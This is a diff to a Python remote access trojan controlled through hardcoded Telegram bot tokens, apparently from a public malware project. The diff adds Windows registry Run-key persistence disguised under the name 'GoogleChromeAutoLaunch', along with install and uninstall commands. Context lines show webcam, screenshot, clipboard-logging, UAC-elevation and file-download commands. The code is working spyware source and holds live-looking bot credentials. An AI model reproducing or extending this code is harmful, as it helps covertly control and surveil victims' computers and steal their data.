@@ -6,10 +6,17 @@ import io
 import time
 import socket
 import threading
+import logging
 import platform
 import os
 import requests
 import traceback
+# presistance
+from typing import Union
+
+# Keep this import at the top of your file
+from winreg import OpenKey, CloseKey, SetValueEx, DeleteValue, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ
+
 
 # Helper function to install required packages
 def install_package(package_name):
@@ -106,6 +113,8 @@ def install_required_packages():
 TOKEN = '6674971461:AAGKnMJ2O9kI5aja2OT8dtgEC9zCy8sQrxA'   #change the token here
 CHAT_ID = '6242806699'   #change the chat id here
 processed_message_ids = []
+
+STARTUP_REG_NAME = "GoogleChromeAutoLaunch"
 
 BACKUP_BOT_TOKEN = '6494367719:AAEiR-lcazJjs6R96sGUqWU80zTZlCat_9s' # Bot that holds tokenchat
 
@@ -421,10 +430,50 @@ def run_as_admin(command):
         print("Client is already elevated.")
 
 
+# Presistance Stuff (Install Command)
+def add_startup() -> Union[str, None]:
+    """ Add Client to startup """
+    # returns None/error
+    if platform.system() != 'Windows':
+        return 'Install feature is only for Windows'
+    if getattr(sys, 'frozen', False):
+        path = sys.executable
+    elif __file__:
+        path = os.path.abspath(__file__)
+    try:
+        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_ALL_ACCESS)
+        SetValueEx(key, STARTUP_REG_NAME, 0, REG_SZ, path)
+        CloseKey(key)
+    except Exception as error:
+        logging.error('Error adding client to startup: %s' % error)
+        return error
+    else:
+        return 'Adding client to startup successful'
+def remove_startup() -> Union[str, None]:
+    """ Remove Client from Startup """
+    # returns None/error
+    if platform.system() != 'Windows':
+        return 'Install feature is only for Windows'
+    try:
+        key = OpenKey(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            0, KEY_ALL_ACCESS)
+        DeleteValue(key, STARTUP_REG_NAME)
+        CloseKey(key)
+    except FileNotFoundError:
+        # File was never registered.
+        # Still returns True, since it's not in startup
+        return 'FileNotFoundError: assume registry key does not exist'
+    except WindowsError as error:
+        logging.error('Error removing client from startup: %s' % error)
+        return error
+    else:
+        return 'Removed Client from Startup'
+
 #coded by machine1337
 def execute_command(command):
     # Convert the specific commands to lowercase for case-insensitive comparison
-    lowercase_commands = ["cd", "location", "dir", "uac", "kill", "elevate", "startup", "info", "screenshot2", "screenshot", "webcam", "network", "install", "help", "download", "cd"]
+    lowercase_commands = ["cd", "location", "dir", "uac", "kill", "elevate", "startup", "info", "screenshot2", "screenshot", "webcam", "uninstall", "install", "network", "pwd", "help", "download", "cd"]
     if command.lower() in lowercase_commands:
         command = command.lower()
     
@@ -586,9 +635,14 @@ def execute_command(command):
         return start_clip_logger()
     elif command == 'clip stop':
         return stop_clip_logger()   
+    elif command == 'uninstall':
+        if platform.system() == 'Windows':
+            return remove_startup()
+        else:
+            return 'Client does not use Windows'
     elif command == 'install':
         if platform.system() == 'Windows':
-            return 'Successfully installed RAT on the system'        
+            return add_startup()
         else:
             return 'Client does not use Windows'
     elif command == 'network':
@@ -708,4 +762,4 @@ if __name__ == '__main__':
 
     # Start the main loop
     main()
-#coded by machine1337. Don't copy this code
+#coded by machine1337. Don't copy this code (sorry...)
